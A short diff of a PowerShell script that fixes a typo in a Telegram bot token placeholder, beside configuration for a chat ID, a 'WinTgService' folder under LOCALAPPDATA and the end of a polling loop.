@@ -3,7 +3,7 @@ $ErrorActionPreference = "Continue"
 $ProgressPreference   = "SilentlyContinue"
 
 # ================= CONFIG =================
-$Token  = "YOUR-TELEGRAM-API-TOKE"
+$Token  = "YOUR-TELEGRAM-API-TOKEN"
 $ChatId = "YOUR-CHAT-ID"
 
 $BaseDir = "$env:LOCALAPPDATA\WinTgService"
@@ -214,3 +214,4 @@ while ($true) {
 
     Start-Sleep -Seconds 3
 }
+
